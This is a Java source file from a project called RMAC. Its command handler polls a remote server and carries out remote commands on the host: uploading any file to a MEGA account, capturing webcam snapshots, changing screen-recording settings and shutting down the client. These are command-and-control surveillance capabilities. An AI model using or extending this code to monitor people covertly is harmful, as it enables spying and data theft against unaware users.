package com.rmac.process;

import com.rmac.RMAC;
import com.rmac.utils.ArchiveFileType;
import com.rmac.utils.Constants;
import com.rmac.utils.Utils;
import java.io.IOException;
import java.util.Objects;
import lombok.extern.slf4j.Slf4j;

/**
 * Non-blocking process that polls the RMAC API Server at a fixed interval for any commands that
 * needs to be executed on the host machine.
 * <br><br>
 * Commands:
 * <br>
 * <code>fetch</code> : Upload any accessible file from this host machine to the configured MEGA
 * account.
 * <br>
 * Usage:
 * <br>
 * <code>fetch X:\abc\xyz.txt</code>
 * <br><br>
 * <code>system</code> : Control RMAC Host-client
 * <br>
 * Usage:
 * <br>
 * <code>system shutdown</code> : Stops the RMAC client on this host
 * <br><br>
 * <code>cam</code> : Capture snapshot from camera
 * <br><br>
 * <code>config</code> : Change RMAC client configuration
 * <br>
 * Usage:
 * <br>
 * <code>config VideoDuration 600000</code> : Set screen recording duration to 10 minutes.
 */
@Slf4j
public class CommandHandler {

  /**
   * Reference to the thread created by this instance
   */
  public Thread thread;

  public CommandHandler() {
    this.createThread();
  }

  public void createThread() {
    thread = new Thread(this::run, "Command");
  }

  public void start() {
    this.thread.start();
  }

  /**
   * Execute the commands targeted for this host.
   *
   * @throws IOException when the command cannot be executed or the command fails.
   */
  public void execute(String[] commandStore) throws IOException {
    try {
      if (Objects.isNull(commandStore) || commandStore.length == 0) {
        return;
      }

      for (String currCommand : commandStore) {
        log.info("Current Task: " + currCommand);
        String command = currCommand;
        if (currCommand.contains(" ")) {
          command = currCommand.substring(0, currCommand.indexOf(' '));
          if ("".equals(command)) {
            continue;
          }
        }
        switch (command) {
          case "fetch": {
            String filePath = currCommand.substring(currCommand.indexOf(' ') + 1);
            if ("".equals(filePath) || !currCommand.contains(" ")) {
              log.warn(Constants.LITERAL_INVALID_COMMAND + currCommand + "'");
              continue;
            }
            if (RMAC.fs.exists(filePath)) {
              RMAC.uploader.uploadFile(filePath, ArchiveFileType.OTHER);
            } else {
              log.warn("Cannot Find File: " + filePath);
            }
            break;
          }
          case "system": {
            String[] args = currCommand.split(" ");
            if (args.length < 2) {
              log.warn("Invalid command '" + currCommand + "'");
              continue;
            }
            if ("shutdown".equals(args[1])) {
              System.exit(0);
            }
            break;
          }
          case "cam": {
            String file = Constants.RUNTIME_LOCATION + "\\Snap-" + Utils.getTimestamp() + ".png";
            Process process = Utils.getImage(file);
            process.waitFor();
            if (!RMAC.fs.exists(file)) {
              log.error("Could not take snapshot");
            } else {
              RMAC.uploader.uploadFile(file, ArchiveFileType.OTHER);
            }
            break;
          }
          case "config": {
            String[] args = currCommand.split(" ");
            if (args.length < 3) {
              log.warn("Invalid command '" + currCommand + "'");
              continue;
            }
            String configName = args[1];
            String configValue = currCommand.substring(currCommand.indexOf(' ') + 1);
            configValue = configValue.substring(configValue.indexOf(' ') + 1);

            try {
              RMAC.config.setConfig(configName, configValue, true);
            } catch (Exception e) {
              log.error("Could not set config", e);
            }
            break;
          }
          default: {
            log.warn("Command not found: '" + currCommand + "'");
          }
        }
      }
    } catch (InterruptedException e) {
      log.error("Could not execute commands", e);
    }
  }

  public void run() {
    try {
      while (!Thread.interrupted()) {
        try {
          this.execute(RMAC.service.getCommands());
        } catch (IOException e) {
          log.error("Could not execute command", e);
        }
        synchronized (this.thread) {
          this.thread.wait(RMAC.config.getFetchCommandPollInterval());
        }
      }
    } catch (InterruptedException | IllegalArgumentException e) {
      log.warn("Stopped", e);
    }
  }

  /**
   * Interrupt the command handler process.
   */
  public void shutdown() {
    this.thread.interrupt();
  }
}
